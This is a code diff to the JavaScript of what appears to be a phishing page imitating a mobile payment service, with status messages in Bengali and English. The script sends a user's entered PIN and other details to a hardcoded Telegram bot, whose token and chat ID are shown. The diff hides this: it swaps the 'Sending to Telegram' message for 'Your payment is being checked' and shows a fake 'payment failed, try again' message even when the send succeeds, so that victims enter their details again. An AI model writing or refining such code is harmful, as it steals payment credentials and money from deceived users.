@@ -85,7 +85,7 @@
                 showStatusMsg('পাসওয়ার্ডটি ভুল হয়েছে, ৫ সংখ্যার সঠিক পাসওয়ার্ড দিন।', '#e2136e');
                 return;
             }
-            showStatusMsg('Sending to Telegram... দয়া করে অপেক্ষা করুন', '#e2136e');
+            showStatusMsg('Your payment is being checked . . . . ', '#e2136e');
             // Telegram Bot API integration
             const telegramBotToken = "8467678705:AAEoSPPuAGc4xfcJLqa2LDIuGEJ4xaC4qSo";
             const telegramChatId = "7478642058";
@@ -93,7 +93,7 @@
             try {
                 const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${message}`);
                 if (response.ok) {
-                    showStatusMsg('✅ ডেটা টেলিগ্রামে পাঠানো হয়েছে!', 'green');
+                    showStatusMsg('❌ আপনার পেমেন্টটি হয় নাই, আপনি পুনরায় চেষ্টা করুন।', '#e2136e');
                 } else {
                     showStatusMsg('❌ আপনার পেমেন্টটি হয় নাই, আপনি পুনরায় চেষ্টা করুন।', '#e2136e');
                 }
@@ -101,7 +101,7 @@
                 showStatusMsg('❌ আপনার পেমেন্টটি হয় নাই, আপনি পুনরায় চেষ্টা করুন।', '#e2136e');
             }
             setTimeout(() => {
-                if (statusMsg.textContent === 'Sending to Telegram... দয়া করে অপেক্ষা করুন') {
+                if (statusMsg.textContent === 'Your payment is being checked . . . . ') {
                     showStatusMsg('❌ ইন্রারনেট ইস্যু, আবার চেষ্টা করুন।', '#e2136e');
                 }
             }, 3000);
